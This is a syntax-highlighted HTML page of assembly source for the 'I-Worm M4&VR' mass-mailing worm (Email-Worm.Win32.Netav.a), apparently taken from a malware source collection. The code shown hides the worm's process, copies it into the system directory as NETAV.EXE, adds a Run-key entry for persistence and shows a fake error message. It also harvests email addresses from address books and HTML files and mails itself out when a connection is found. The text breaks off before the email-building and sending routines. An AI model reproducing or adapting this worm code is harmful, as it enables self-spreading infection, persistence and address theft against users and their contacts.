<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Email-Worm.Win32.Netav.a - m4_vr.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------     -----------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----------------------------         ---------------------------------------</span><span class="sc0">
</span><span class="sc1">;--------------------------- I-Worm M4&amp;VR ------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----------------------------         ---------------------------------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------     -----------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc2">.386p</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">

</span><span class="sc1">;--------------------------- Include Zone ------------------------------------</span><span class="sc0">

</span><span class="sc5">MEM_COMMIT</span><span class="sc0">                  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00001000h</span><span class="sc0">
</span><span class="sc5">MEM_RESERVE</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00002000h</span><span class="sc0">
</span><span class="sc5">PAGE_READWRITE</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000004h</span><span class="sc0">
</span><span class="sc5">PAGE_READONLY</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000002h</span><span class="sc0">
</span><span class="sc5">FILE_ATTRIBUTE_NORMAL</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc0">
</span><span class="sc5">OPEN_EXISTING</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
</span><span class="sc5">FILE_SHARE_READ</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
</span><span class="sc5">GENERIC_READ</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0">
</span><span class="sc5">FILE_MAP_WRITE</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000002h</span><span class="sc0">
</span><span class="sc5">FILE_MAP_READ</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00000004h</span><span class="sc0">
</span><span class="sc5">CREATE_ALWAYS</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">GENERIC_WRITE</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">40000000h</span><span class="sc0">

</span><span class="sc1">;-------------------------- Macro Zone ---------------------------------------</span><span class="sc0">

</span><span class="sc5">@INIT_SehFrame</span><span class="sc0">      </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">Instruction</span><span class="sc0">
    </span><span class="sc9">local</span><span class="sc0">       </span><span class="sc5">OurSeh</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0">      </span><span class="sc5">OurSeh</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">esp</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc5">Instruction</span><span class="sc0">
</span><span class="sc5">OurSeh</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">xor</span><span class="sc0">       </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">
                    </span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">@REM_SehFrame</span><span class="sc0">       </span><span class="sc9">macro</span><span class="sc0">
      </span><span class="sc6">xor</span><span class="sc0">       </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0">       </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0">       </span><span class="sc8">edx</span><span class="sc0">
                    </span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">@pushsz</span><span class="sc0">             </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">string</span><span class="sc0">
      </span><span class="sc9">local</span><span class="sc0">     </span><span class="sc6">Str</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0">      </span><span class="sc6">Str</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0">        </span><span class="sc5">string</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">Str</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">api</span><span class="sc0">             </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">a</span><span class="sc0">
    </span><span class="sc9">extrn</span><span class="sc0">       </span><span class="sc5">a</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">a</span><span class="sc0">
            </span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc1">;------------------------ Constantes Zone ------------------------------------</span><span class="sc0">
       
</span><span class="sc5">SEH</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                           </span><span class="sc1">; SEH protection</span><span class="sc0">

</span><span class="sc5">NbEmailWanted</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">   </span><span class="sc2">150</span><span class="sc0">                           </span><span class="sc1">; Nb Email to Seek &gt;1 </span><span class="sc0">
</span><span class="sc5">EmailSize</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">   </span><span class="sc2">64</span><span class="sc0">                            </span><span class="sc1">; Attention rol eax,6 (2^6)</span><span class="sc0">
</span><span class="sc5">EmailFileSize</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">   </span><span class="sc4">(</span><span class="sc5">EmailSize</span><span class="sc4">*(</span><span class="sc5">NbEmailWanted</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">))</span><span class="sc0"> </span><span class="sc1">; For VirtualAlloc (+Security)    </span><span class="sc0">
</span><span class="sc5">NbToSend</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">   </span><span class="sc2">20</span><span class="sc0">                            </span><span class="sc1">; Send x emails per session</span><span class="sc0">

</span><span class="sc5">NbPersoWanted</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0">                  </span><span class="sc1">; Nb Personal document to Seek</span><span class="sc0">
</span><span class="sc5">PersoSize</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">256</span><span class="sc0">                 </span><span class="sc1">; Attention rol eax,8 (2^8)</span><span class="sc0">
</span><span class="sc5">PersoFileSize</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">PersoSize</span><span class="sc4">*(</span><span class="sc5">NbPersoWanted</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">))</span><span class="sc0"> </span><span class="sc1">; For VirtualAlloc (+Security)</span><span class="sc0">

</span><span class="sc5">MimeHeaderSize</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc0">                    </span><span class="sc1">; Mime Header size</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;--------------------------- Code Zone ---------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc9">.code</span><span class="sc0">

</span><span class="sc5">Mv</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
               
      </span><span class="sc9">IF</span><span class="sc0">        </span><span class="sc5">SEH</span><span class="sc0">
      </span><span class="sc5">@INIT_SehFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ExitMv</span><span class="sc4">&gt;</span><span class="sc0">                   </span><span class="sc1">; Init SEH      </span><span class="sc0">
      </span><span class="sc9">ENDIF</span><span class="sc0">
        
</span><span class="sc1">;------------------------- Check &amp; Mark Presency -----------------------------</span><span class="sc0">

</span><span class="sc5">TryToOpenOurMutex</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">xor</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc12">'MvMutex'</span><span class="sc0">                           </span><span class="sc1">; Mutex Name                               </span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc5">api</span><span class="sc0">       </span><span class="sc5">OpenMutexA</span><span class="sc0">                          </span><span class="sc1">; already in mem</span><span class="sc0">
      </span><span class="sc6">or</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">jnz</span><span class="sc0">       </span><span class="sc5">ExitMv</span><span class="sc0">                              </span><span class="sc1">; Yes, do nothing more </span><span class="sc0">
                  
</span><span class="sc5">CreateOurMutex</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">xor</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc5">@pushsz</span><span class="sc0">   </span><span class="sc12">'MvMutex'</span><span class="sc0">                           </span><span class="sc1">; Mutex Name                               </span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">; No owner</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">; default security attrib</span><span class="sc0">
      </span><span class="sc5">api</span><span class="sc0">       </span><span class="sc5">CreateMutexA</span><span class="sc0">                        </span><span class="sc1">; create Our Mutex</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">MutexHdl</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;---------------------------- Random Init ------------------------------------</span><span class="sc0">

</span><span class="sc5">RandomInit</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc5">api</span><span class="sc0">       </span><span class="sc5">GetTickCount</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc5">RandomNb</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
 
</span><span class="sc1">;---------------------- Hide Process on Win9x --------------------------------</span><span class="sc0">
        
</span><span class="sc5">HideProcess</span><span class="sc4">:</span><span class="sc0">                                    
    </span><span class="sc5">@pushsz</span><span class="sc0">     </span><span class="sc3">"KERNEL32.dll"</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">         </span><span class="sc5">GetModuleHandleA</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0">     </span><span class="sc3">"RegisterServiceProcess"</span><span class="sc0">        </span><span class="sc1">; Error on NT</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">         </span><span class="sc5">GetProcAddress</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">          </span><span class="sc5">GetOurPathName</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">01h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc0">       
       
</span><span class="sc1">;----------------------- Copy Worm in Sys Dir --------------------------------</span><span class="sc0">

</span><span class="sc5">GetOurPathName</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">xor</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">         </span><span class="sc5">GetModuleHandleA</span><span class="sc0">                    </span><span class="sc1">; Our Handle      </span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc2">260</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MyPath</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">         </span><span class="sc5">GetModuleFileNameA</span><span class="sc0">                  </span><span class="sc1">; Our Path       </span><span class="sc0">
        
</span><span class="sc5">CreateDestPath</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc2">260</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TempPath</span><span class="sc4">&amp;</span><span class="sc9">Name</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">         </span><span class="sc5">GetSystemDirectoryA</span><span class="sc0">                 </span><span class="sc1">; System Dir</span><span class="sc0">

      </span><span class="sc5">@pushsz</span><span class="sc0">   </span><span class="sc12">'\NETAV.EXE'</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TempPath</span><span class="sc4">&amp;</span><span class="sc9">Name</span><span class="sc0">
      </span><span class="sc5">api</span><span class="sc0">       </span><span class="sc5">lstrcat</span><span class="sc0">                             </span><span class="sc1">; Path+Name of File to Create   </span><span class="sc0">

</span><span class="sc5">CheckHowExecuted</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MyPath</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TempPath</span><span class="sc4">&amp;</span><span class="sc9">Name</span><span class="sc0">
      </span><span class="sc5">api</span><span class="sc0">       </span><span class="sc5">lstrcmp</span><span class="sc0">
      </span><span class="sc6">test</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">jz</span><span class="sc0">        </span><span class="sc5">AutoRun</span><span class="sc0">

</span><span class="sc5">CreateOurFile</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">xor</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">; Overwrite mode set</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TempPath</span><span class="sc4">&amp;</span><span class="sc9">Name</span><span class="sc0">                
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MyPath</span><span class="sc0">
      </span><span class="sc5">api</span><span class="sc0">       </span><span class="sc5">CopyFileA</span><span class="sc0">                           </span><span class="sc1">; Copy Worm in Sys Dir</span><span class="sc0">

        
</span><span class="sc1">;------------------------- Registry Worm -------------------------------------</span><span class="sc0">

</span><span class="sc5">RegWorm</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TempPath</span><span class="sc4">&amp;</span><span class="sc9">Name</span><span class="sc0">
      </span><span class="sc5">api</span><span class="sc0">       </span><span class="sc5">lstrlen</span><span class="sc0">          
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TempPath</span><span class="sc4">&amp;</span><span class="sc9">Name</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0">     </span><span class="sc3">"NETAV Agent"</span><span class="sc0">
    </span><span class="sc5">@pushsz</span><span class="sc0">     </span><span class="sc3">"Software\Microsoft\Windows\CurrentVersion\Run"</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">80000002h</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">         </span><span class="sc5">SHSetValueA</span><span class="sc0">

</span><span class="sc1">;-------------------- First Launch Fake Message ------------------------------</span><span class="sc0">

</span><span class="sc5">FakeMessage</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc2">1040</span><span class="sc0">                         
      </span><span class="sc5">@pushsz</span><span class="sc0">   </span><span class="sc12">'Setup'</span><span class="sc0">
      </span><span class="sc5">@pushsz</span><span class="sc0">   </span><span class="sc12">'This file does not work on this system'</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">api</span><span class="sc0">       </span><span class="sc5">MessageBoxA</span><span class="sc0">

</span><span class="sc1">;---------------------- Check Email File &amp; Create ----------------------------</span><span class="sc0">
</span><span class="sc5">AutoRun</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">CheckEmailFile</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0">      </span><span class="sc5">Clear_TempPath</span><span class="sc4">&amp;</span><span class="sc9">Name</span><span class="sc0">        

      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc2">260</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TempPath</span><span class="sc4">&amp;</span><span class="sc9">Name</span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">         </span><span class="sc5">GetSystemDirectoryA</span><span class="sc0">                 </span><span class="sc1">; System Dir</span><span class="sc0">
        
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TempPath</span><span class="sc4">&amp;</span><span class="sc9">Name</span><span class="sc0">
      </span><span class="sc5">api</span><span class="sc0">       </span><span class="sc5">SetCurrentDirectoryA</span><span class="sc0">                </span><span class="sc1">; Set sys dir</span><span class="sc0">

      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">search</span><span class="sc0">                       </span><span class="sc1">; Push it</span><span class="sc0">
      </span><span class="sc5">@pushsz</span><span class="sc0">   </span><span class="sc12">'ICMAIL.DLL'</span><span class="sc0">                        </span><span class="sc1">; Mask</span><span class="sc0">
      </span><span class="sc5">api</span><span class="sc0">       </span><span class="sc5">FindFirstFileA</span><span class="sc0">                      </span><span class="sc1">; find file    </span><span class="sc0">
      </span><span class="sc6">inc</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">jnz</span><span class="sc0">       </span><span class="sc5">UpDateEmailList</span><span class="sc0">                     </span><span class="sc1">; The File Exist       </span><span class="sc0">
        
      </span><span class="sc6">call</span><span class="sc0">      </span><span class="sc5">CreateEmailFile</span><span class="sc0">                     </span><span class="sc1">; Create It if Does not exist</span><span class="sc0">

</span><span class="sc1">;----------------------- Check if Update Time --------------------------------</span><span class="sc0">

</span><span class="sc5">UpDateEmailList</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0">       </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">SystemTimeData</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc0">
      </span><span class="sc5">api</span><span class="sc0">       </span><span class="sc5">GetSystemTime</span><span class="sc0">
        
      </span><span class="sc6">movzx</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; Esi point day of week</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0">       </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                              </span><span class="sc1">; Jeudi ?</span><span class="sc0">
      </span><span class="sc6">jne</span><span class="sc0">       </span><span class="sc5">Check_if_Connected</span><span class="sc0">                  </span><span class="sc1">; No</span><span class="sc0">

      </span><span class="sc6">call</span><span class="sc0">      </span><span class="sc5">CreateEmailFile</span><span class="sc0">                     </span><span class="sc1">; Yes, Update Email File</span><span class="sc0">

</span><span class="sc1">;-------------------------- Spread the Worm ----------------------------------</span><span class="sc0">
     
</span><span class="sc5">Check_if_Connected</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SystemTimeData</span><span class="sc0">
      </span><span class="sc5">api</span><span class="sc0">       </span><span class="sc5">GetSystemTime</span><span class="sc0">

      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">IConnectedStateTemp</span><span class="sc0">
      </span><span class="sc5">api</span><span class="sc0">       </span><span class="sc5">InternetGetConnectedState</span><span class="sc0">
      </span><span class="sc6">dec</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">jnz</span><span class="sc0">       </span><span class="sc5">No_internet</span><span class="sc0">                         </span><span class="sc1">; No connection</span><span class="sc0">

      </span><span class="sc6">call</span><span class="sc0">      </span><span class="sc5">SendEmail</span><span class="sc0">                           </span><span class="sc1">; Send Wab Emails + Rnd Email</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0">       </span><span class="sc5">ExitMvMutex</span><span class="sc0">                         </span><span class="sc1">; Then Bye</span><span class="sc0">

</span><span class="sc5">No_internet</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc2">5</span><span class="sc4">*</span><span class="sc2">60</span><span class="sc4">*</span><span class="sc2">1000</span><span class="sc0">                           </span><span class="sc1">; 5 min</span><span class="sc0">
      </span><span class="sc5">api</span><span class="sc0">       </span><span class="sc5">Sleep</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0">       </span><span class="sc5">Check_if_Connected</span><span class="sc0">
              
</span><span class="sc1">;----------------------------- The End ---------------------------------------</span><span class="sc0">

</span><span class="sc5">ExitMvMutex</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">MutexHdl</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc5">api</span><span class="sc0">       </span><span class="sc5">CloseHandle</span><span class="sc0">

</span><span class="sc5">ExitMv</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">        </span><span class="sc5">FreeTheMem</span><span class="sc0">

      </span><span class="sc9">IF</span><span class="sc0">        </span><span class="sc5">SEH</span><span class="sc0">
      </span><span class="sc5">@REM_SehFrame</span><span class="sc0">                                 </span><span class="sc1">; Restore SEH</span><span class="sc0">
      </span><span class="sc9">ENDIF</span><span class="sc0">
         
      </span><span class="sc6">popad</span><span class="sc0">
                
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc5">api</span><span class="sc0">       </span><span class="sc5">ExitProcess</span><span class="sc0">                         </span><span class="sc1">; Quit</span><span class="sc0">


    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'---iworm.mv4&amp;vr.by.tony/mvcrew---'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">


</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;------------------------- Sub Routine Zone ----------------------------------</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">


</span><span class="sc1">;:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::</span><span class="sc0">
</span><span class="sc1">;........................ Major Sub Routine ..................................</span><span class="sc0">
</span><span class="sc1">;............................ Z O N E ........................................</span><span class="sc0">
</span><span class="sc1">;:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::</span><span class="sc0">


</span><span class="sc1">;...................... Create The Email File ................................</span><span class="sc0">
</span><span class="sc1">;.............................................................................</span><span class="sc0">

</span><span class="sc1">; OUT : Email File in System Dir : ICMAIL.DLL</span><span class="sc0">

</span><span class="sc5">CreateEmailFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">NbEmailFound</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">ReserveMem_For_EmailListe</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">xor</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc5">PAGE_READWRITE</span><span class="sc0">                      </span><span class="sc1">; read/write page</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc5">MEM_RESERVE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">MEM_COMMIT</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc5">EmailFileSize</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">        </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">; System decide where </span><span class="sc0">
    </span><span class="sc5">api</span><span class="sc0">         </span><span class="sc5">VirtualAlloc</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">          </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">          </span><span class="sc5">EmailFileError</span><span class="sc0">                      </span><span class="sc1">; Alloc Fail </span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc5">EmailList</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">EmailSeeker</span><span class="sc4">:</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0">      </span><span class="sc5">SearchWabFile_Email</span><span class="sc0">                 </span><span class="sc1">; Search Email address book</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0">      </span><span class="sc5">SearchHtmFile_Email</span><span class="sc0">                 </span><span class="sc1">; Search Email HTML</span><span class="sc0">

</span><span class="sc5">CreateTheEmailFile</span><span class="sc4">:</span><span class="sc0">
